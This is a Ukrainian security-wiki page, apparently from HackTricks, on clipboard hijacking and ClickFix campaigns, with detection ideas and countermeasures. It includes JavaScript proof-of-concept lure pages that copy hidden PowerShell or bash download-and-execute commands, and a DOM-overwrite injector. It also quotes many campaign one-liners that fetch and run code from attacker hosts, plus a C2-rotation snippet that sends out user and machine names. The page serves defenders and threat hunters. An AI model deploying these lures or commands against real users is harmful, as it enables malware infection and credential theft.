# Атаки Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте нічого, що скопіювали не ви самі." – стара, але досі актуальна порада

## Огляд

Clipboard hijacking – також відомий як *pastejacking* – використовує той факт, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Шкідлива вебсторінка (або будь-який контекст із підтримкою JavaScript, наприклад Electron- чи Desktop-застосунок) програмно розміщує контрольований зловмисником текст у системному буфері обміну. Жертв зазвичай за допомогою ретельно підготовлених інструкцій із соціальної інженерії спонукають натиснути **Win + R** (діалогове вікно Run), **Win + X** (Quick Access / PowerShell) або відкрити термінал і *вставити* вміст буфера, негайно виконавши довільні команди.

Оскільки **жоден файл не завантажується і жоден вкладений файл не відкривається**, техніка обходить більшість засобів безпеки електронної пошти та вебконтенту, які відстежують вкладення, макроси або пряме виконання команд. Тому ця атака популярна у phishing-кампаніях, що доставляють поширені сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper-и для заміни адрес гаманців

Інший варіант **clipboard hijacking** взагалі не вставляє команди: він очікує, доки жертва скопіює **адресу cryptocurrency-гаманця**, а потім непомітно замінює її на контрольовану зловмисником безпосередньо перед вставленням. Це особливо ефективно для довгих форматів адрес гаманців, оскільки користувачі часто перевіряють лише перші й останні символи.<sup>[[8]](#references)</sup>

Поширені ознаки атак у реальному світі:
- **Thin loader + nested payload**: видимий app/exe виглядає як легітимний trading або "profit" інструмент, тоді як справжній clipper прихований глибше в bundle (наприклад, .NET loader запускає вкладений Rust payload).
- **Regex-driven replacement**: malware зіставляє рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` або навіть загальні **44-символьні рядки, подібні до Solana**, і замінює їх на гаманці зловмисників.
- **Wallet rotation at scale**: сучасні Windows-зразки можуть містити **тисячі** адрес для заміни на кожну валюту замість однієї статичної адреси, зменшуючи репутаційні втрати гаманця після кожної крадіжки.<sup>[[8]](#references)</sup>

### Процес роботи Windows clipper

Поширена реалізація – це приховане вікно, зареєстроване за допомогою **`AddClipboardFormatListener`**. Під час кожного оновлення буфера обміну malware зазвичай викликає:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → отримати доступ до поточних даних буфера обміну.
- **`GetClipboardData`** → прочитати текст.
- **`EmptyClipboard`** + **`SetClipboardData`** → замінити рядок адреси гаманця на значення зловмисника.

Мінімальні regex-и для hunting, які часто зустрічаються в clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Для впливу достатньо persistence на рівні користувача. Один із зафіксованих шаблонів:<sup>[[8]](#references)</sup>
- Скопіювати payload до **`%APPDATA%\silke\silke.exe`**
- Створити **LNK у Startup-folder** за шляхом `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ідеї для виявлення:
- Процеси, які безперервно викликають clipboard API, одночасно записуючи дані до `%APPDATA%` і папки **Startup** користувача.
- Створення нових LNK/виконуваних файлів із подальшим переписуванням адрес криптогаманців у clipboard.
- Архіви або пакети підробленого програмного забезпечення, що містять багато невикористаних файлів і невеликий launcher, який запускає вкладений binary.

### Видалення quarantine через social engineering на macOS + persistence через LaunchAgent

На macOS деякі кампанії постачають helper **`unlocker.command`** та інструктують жертву клацнути правою кнопкою миші → **Open**, якщо Gatekeeper повідомляє, що застосунок пошкоджений або походить від невідомого розробника. Скрипт просто видаляє quarantine і запускає розташований поруч `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Це **не експлойт Gatekeeper**; це **обхід quarantine за допомогою соціальної інженерії**, який використовує той факт, що рішення Gatekeeper залежать від xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Після виконання clipper може закріпитися від імені поточного користувача, записавши:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent із `RunAtLoad` і `KeepAlive`

Корисна деталь для захисту: деякі зразки реалізують **self-healing watchdog**, який приблизно кожні 30 секунд повторно записує LaunchAgent і wrapper. Якщо спочатку видалити plist **без завершення запущеного процесу**, malware може негайно створити його знову.<sup>[[8]](#references)</sup> Безпечний порядок очищення:
1. Завершити активний процес clipper.
2. Вивантажити/видалити plist LaunchAgent.
3. Видалити `~/launch.sh` і скопійований payload.

### Примітка щодо доставки: фальшива репутація як множник ефективності

Для цього сімейства malware може залишатися технічно простим, тоді як **рівень розповсюдження** виконує основну роботу: фальшиві зірки/форки GitHub, відгуки/завантаження на SourceForge, коментарі/перегляди під навчальними відео на YouTube та нешкідливі на вигляд коментарі/голоси на VirusTotal використовуються, щоб створити враження надійності binary перед виконанням.<sup>[[8]](#references)</sup>

## Примусові кнопки копіювання та приховані payloads (однорядкові команди macOS)

Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **змушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у clipboard містить очікувану команду інсталятора та доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому одна вставка виконує обидві частини, тоді як UI приховує додатковий етап.<sup>[[5]](#references)</sup>

## Proof-of-Concept на JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старіші кампанії використовували `document.execCommand('copy')`, а новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Потік ClickFix / ClearFake

1. Користувач відвідує сайт із typosquatting або скомпрометований сайт (наприклад, `docusign.sa[.]com`)
2. Ін'єктований **ClearFake** JavaScript викликає helper `unsecuredCopyToClipboard()`, який непомітно зберігає закодований у Base64 однорядковий PowerShell-скрипт у буфері обміну.
3. HTML-інструкції повідомляють жертві: *«Натисніть **Win + R**, вставте команду та натисніть Enter, щоб усунути проблему.»*
4. `powershell.exe` виконується та завантажує архів, що містить легітимний виконуваний файл і шкідливу DLL (класичний DLL sideloading).
5. Loader розшифровує додаткові етапи, ін'єктує shellcode та встановлює persistence (наприклад, scheduled task), зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Приклад ланцюжка NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своїй директорії `msvcp140.dll`.
* Шкідлива DLL динамічно розв'язує API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх за допомогою змінного XOR-ключа `"https://google.com/"`, впроваджує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader усередині **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаним застосунком → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований скрипт PowerShell, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` і конкатенації файлів, а зрештою запускає скрипт `.a3x`, що ексфільтрує облікові дані браузера на `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Буфер обміну → PowerShell → JS eval → Startup LNK із ротацією C2 (PureHVNC)

Деякі кампанії ClickFix повністю оминають завантаження файлів і натомість інструктують жертв вставити однорядок, який отримує та виконує JavaScript через WSH, забезпечує persistence і щодня змінює C2. Приклад спостережуваного ланцюжка:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Обфускований URL, що розгортається під час виконання для протидії поверхневому аналізу.
- JavaScript забезпечує власне збереження через Startup LNK (WScript/CScript) і вибирає C2 за поточним днем, що дає змогу швидко змінювати домени.<sup>[[3]](#references)</sup>

Мінімальний фрагмент JS для ротації C2 за датою:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто закріплюючи TLS на жорстко заданому сертифікаті та розбиваючи трафік на фрагменти.<sup>[[3]](#references)</sup>

Ідеї для виявлення, специфічні для цього варіанта
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який запускає WScript/CScript із шляхом до JS у `%TEMP%`/`%APPDATA%`.
- Телеметрія Registry/RunMRU і командних рядків, що містить `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` із великими payload через stdin для передавання довгих скриптів без довгих командних рядків.
- Scheduled Tasks, які згодом запускають LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, у межах завдання/шляху, що імітує updater (наприклад, `\GoogleSystem\GoogleUpdater`).

Пошук загроз
- C2-хостнейми та URL, що змінюються щодня, із шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Співвідносити події запису в clipboard, після яких відбувається вставлення через Win+R і негайний запуск `powershell.exe`.

Blue-teams можуть поєднати телеметрію clipboard, створення процесів і Registry, щоб точно виявляти зловживання pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** — шукайте незвичні записи Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe`, а `NewProcessName` входить до { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або тимчасових папках безпосередньо перед підозрілою подією 4688.
* Сенсори clipboard в EDR (якщо наявні) — співвідносити `Clipboard Write`, після якого негайно запускається новий процес PowerShell.

## Сторінки перевірки в стилі IUAM (ClickFix Generator): копіювання clipboard до консолі + payload з урахуванням ОС

Останні кампанії масово створюють підроблені сторінки перевірки CDN/браузера ("Just a moment…", у стилі IUAM), які змушують користувачів копіювати специфічні для ОС команди з clipboard у native-консолі. Це переміщує виконання за межі sandbox браузера та працює у Windows і macOS.<sup>[[4]](#references)</sup>

Основні ознаки сторінок, створених builder
- Визначення ОС через `navigator.userAgent` для адаптації payload (Windows PowerShell/CMD проти macOS Terminal). Необов'язкові decoy/no-op для непідтримуваних ОС, щоб зберігати ілюзію.
- Автоматичне копіювання до clipboard під час безпечних дій в UI (checkbox/Copy), хоча видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв і popover із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → відкрити Terminal→paste→Enter.
- Необов'язкова обфускація та single-file injector для перезапису DOM скомпрометованого сайту через verification UI у стилі Tailwind (реєстрація нового домену не потрібна).<sup>[[4]](#references)</sup>

Приклад: невідповідність clipboard + розгалуження з урахуванням ОС
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Збереження виконання початкового запуску в macOS
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання продовжувалося після закриття термінала, зменшуючи кількість помітних артефактів.<sup>[[4]](#references)</sup>

Підміна сторінки безпосередньо на скомпрометованих сайтах
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ідеї для виявлення та пошуку, специфічні для IUAM-style lure
- Веб: сторінки, які прив’язують Clipboard API до віджетів верифікації; невідповідність між відображуваним текстом і даними в буфері обміну; розгалуження за `navigator.userAgent`; Tailwind + заміна однієї сторінки в підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` невдовзі після взаємодії з браузером; інсталятори batch/MSI, запущені з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, що запускає `bash`/`curl`/`base64 -d` з `nohup` поблизу подій у браузері; фонові завдання, які продовжують працювати після закриття термінала.
- Співвідносити історію `RunMRU` Win+R і записи в буфер обміну з подальшим створенням консольних процесів.

Див. також допоміжні техніки

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати сайти WordPress та впроваджувати loader JavaScript, який поєднує зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть виклики блокчейн-механізму “etherhiding” (наприклад, POST-запити до API-ендпойнтів Binance Smart Chain, таких як `bsc-testnet.drpc[.]org`), щоб отримувати актуальну логіку lure. В останніх накладках активно використовуються fake CAPTCHA, які інструктують користувачів скопіювати/вставити однорядкову команду (T1204.004), а не щось завантажувати.<sup>[[6]](#references)</sup>
- Початкове виконання дедалі частіше делегується підписаним хостам скриптів/LOLBAS. У ланцюжках January 2026 попереднє використання `mshta` замінили на вбудований `SyncAppvPublishingServer.vbs`, який виконується через `WScript.exe` з передаванням аргументів, подібних до PowerShell, з alias і wildcard для отримання віддаленого вмісту:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у парі з `WScript.exe` та незвичними аргументами (аліаси `gal`/`gcm`, cmdlet'и з wildcard, URL-адреси jsDelivr) він стає високосигнальним етапом LOLBAS для ClearFake.<sup>[[6]](#references)</sup>
- У лютому 2026 року підроблені payload'и CAPTCHA знову перейшли до використання виключно PowerShell download cradles. Два активні приклади:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перший ланцюжок є `iex(irm ...)` grabber'ом, що працює в пам'яті; другий використовує `WinHttp.WinHttpRequest.5.1`, записує тимчасовий `.ps1`, а потім запускає його з `-ep bypass` у прихованому вікні.<sup>[[6]](#references)</sup>

Поради щодо виявлення та полювання на ці варіанти
- Родословна процесів: браузер → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після запису в clipboard/Win+R.
- Ключові слова командного рядка: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker або шаблони з raw IP `iex(irm ...)`.
- Мережа: вихідні підключення до CDN worker hosts або blockchain RPC endpoints із script hosts/PowerShell невдовзі після перегляду вебсторінок.
- Файли/реєстр: створення тимчасового `.ps1` у `%TEMP%` разом із записами RunMRU, що містять ці one-liner'и; блокувати/створювати сповіщення для signed-script LOLBAS (WScript/cscript/mshta), які виконуються із зовнішніми URL або obfuscated alias strings.

## Тактики ClickFix у червні 2026 року: paste telemetry, fake verification comments і LOLBin chaining

Нещодавня telemetry від Red Canary показує, що стабільним індикатором є **не одна конкретна команда**, а поєднання **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** та **immediate execution**.<sup>[[7]](#references)</sup>

### Помітні операторські шаблони

- **Paste confirmation telemetry**: деякі payload'и викликають `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` перед основним stage. Це підтверджує взаємодію користувача, водночас зберігаючи вікно коротким і непомітним.
- **Fake verification comments**: PowerShell one-liner'и можуть додавати такі рядки, як `# Security check ✔️ I'm not a robot Verification ID: 138105`, щоб після вставлення в Run / `cmd.exe` / історію PowerShell команда все ще виглядала пов'язаною з CAPTCHA.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` приховує статичний URL у командному рядку, водночас виконуючи download-and-execute у пам'яті.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` зловживає незвичним регістром і Unicode-подібними символами у flags, щоб обійти крихкі механізми виявлення, водночас імітуючи `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` може приховувати ключові слова за допомогою escape-символів `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), запускати вкладену shell у мінімізованому режимі, зберігати attacker content із benign extension, наприклад `.pdf`, а потім виконувати його через `mshta`.<sup>[[7]](#references)</sup>
## Заходи протидії

1. Посилення безпеки браузера – вимкнути clipboard write-access (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати user gesture.
2. Обізнаність щодо безпеки – навчати користувачів *вводити* чутливі команди вручну або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liner'ів.
4. Мережеві засоби контролю – блокувати вихідні запити до відомих pastejacking і malware C2 domains.

## Пов'язані трюки

* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів на malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Виправлення Click: запобігання вектору атаки ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: від RAT до Builder і Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Фабрика ClickFix: перше розкриття IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 рік – рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: лютий 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: червень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Від Stars до Upvotes: Fake Reputation, що підживлює Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
